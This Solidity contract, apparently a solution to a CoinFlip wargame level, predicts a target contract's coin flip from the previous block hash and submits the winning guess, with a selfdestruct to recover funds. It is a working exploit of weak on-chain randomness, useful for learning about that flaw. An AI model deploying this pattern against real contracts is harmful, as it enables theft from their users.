// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {CoinFlip} from "./CoinFlip.sol";

contract AttackCoinFlip is Ownable {
    CoinFlip coinFlipContract;
    uint256 lastHash;
    uint256 FACTOR;

    constructor(address _coinFlipAddress, uint256 _factor) Ownable(msg.sender) {
        coinFlipContract = CoinFlip(_coinFlipAddress);
        FACTOR = _factor;
    }

    function attack() external payable onlyOwner {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert("Already flipped. Wait for next block.");
        }
        lastHash = blockValue;

        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        coinFlipContract.flip(side);
    }

    function finish() external onlyOwner {
        selfdestruct(payable(owner())); // selfdestruct is deprecated
    }
}
